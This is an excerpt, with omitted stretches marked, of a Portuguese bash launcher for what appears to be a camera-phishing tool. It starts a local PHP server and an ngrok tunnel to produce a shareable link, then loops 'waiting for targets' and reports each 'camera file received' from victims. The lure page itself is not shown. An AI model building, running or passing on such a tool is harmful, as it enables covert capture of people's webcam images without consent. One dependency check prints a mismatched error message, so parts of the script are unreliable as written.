...
# Se você usar qualquer parte deste código, me dê créditos. Leia a Licença!
clear
...
echo "      N073:> POR FAVOR, ATIVE SEU PONTO DE ACESSO WIFI 
                   OU VOCÊ NÃO OBTERÁ O LINK....!"
...
command -v php > /dev/null 2>&1 || { echo >&2 "Eu preciso de php, mas não está instalado. Instale-o. Abortando."; exit 1; }
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Esperando alvos, pressione Ctrl + C para sair...\e[0m\n"
while [ true ]; do
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Arquivo de câmera recebido!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
...
command -v ssh > /dev/null 2>&1 || { echo >&2 "Eu preciso de ssh, mas não está instalado. Instale-o. Abortando."; exit 1; }
...
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Iniciando o servidor php... (localhost:3333)\e[0m\n"
...
command -v unzip > /dev/null 2>&1 || { echo >&2 "Eu preciso de unzip, mas não está instalado. Instale-o. Abortando."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Eu preciso de wget, mas não está instalado. Instale-o. Abortando."; exit 1; }
...
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando o servidor ngrok...\n"
...
command -v php > /dev/null 2>&1 || { echo >&2 "Eu preciso de ssh, mas não está instalado. Instale-o. Abortando."; exit 1; }
start
